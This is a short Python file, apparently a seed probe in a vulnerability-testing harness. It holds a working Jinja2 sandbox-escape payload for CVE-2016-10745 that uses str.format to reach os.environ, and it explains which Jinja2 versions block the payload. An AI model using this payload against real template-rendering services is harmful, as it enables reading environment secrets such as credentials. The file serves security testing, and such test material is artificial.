#!/usr/bin/env python3
"""[GIVEN] CVE-2016-10745 seed exploit for jinja2-cve-2019-10906.

The classic Jinja2 sandbox escape via `str.format`: a template whose ONLY dangerous
element is a native string-format field walk. `"{cfg.__init__.__globals__[os].environ[
PCB_CANARY]}".format(cfg=cfg)` performs attribute/item access NATIVELY inside str.format,
bypassing the sandbox's getattr guard, and reaches os.environ to read the planted canary.

Behaviour by version (see docker-compose.yml):
  V0 (2.7.3): call() has no format interception -> native format runs -> reaches flag.
  V1 (2.8.1): inspect_format_method intercepts `.format` -> routed through SandboxedFormatter,
              whose get_field calls env.getattr('__init__') -> SecurityError -> BLOCKED.  <- required
  V2 (2.10.1): still intercepted -> BLOCKED.
"""

PAYLOAD = (
    '{{ "{cfg.__init__.__globals__[os].environ[PCB_CANARY]}".format(cfg=cfg) }}'
)


def candidate() -> dict:
    return {"probe_id": "cve-2016-10745-str-format", "code": PAYLOAD}


if __name__ == "__main__":
    print(candidate()["code"])
